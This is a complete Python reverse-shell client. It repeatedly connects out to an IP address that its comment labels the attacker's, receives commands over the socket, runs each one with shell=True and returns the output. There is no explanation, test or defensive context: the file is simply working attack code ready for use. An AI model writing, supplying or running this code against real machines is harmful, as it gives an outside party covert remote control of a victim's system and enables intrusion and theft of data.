import socket
import subprocess
import time
import os

SERVER_IP = '192.168.1.5'  # 🔧 Change this to your attacker's IP
PORT = 4444                # Must match your server's PORT

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, PORT))
            shell(s)
        except Exception as e:
            time.sleep(5)  # Wait before retrying connection

def shell(s):
    while True:
        try:
            command = s.recv(1024).decode().strip()
            if command.lower() == 'exit':
                break

            if command:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                result = output.stdout + output.stderr
                s.send(result.encode() if result else b'[+] Command executed with no output.\n')
        except Exception as e:
            try:
                s.send(f"[!] Error: {str(e)}\n".encode())
            except:
                pass
            break

    s.close()

if __name__ == "__main__":
    connect()
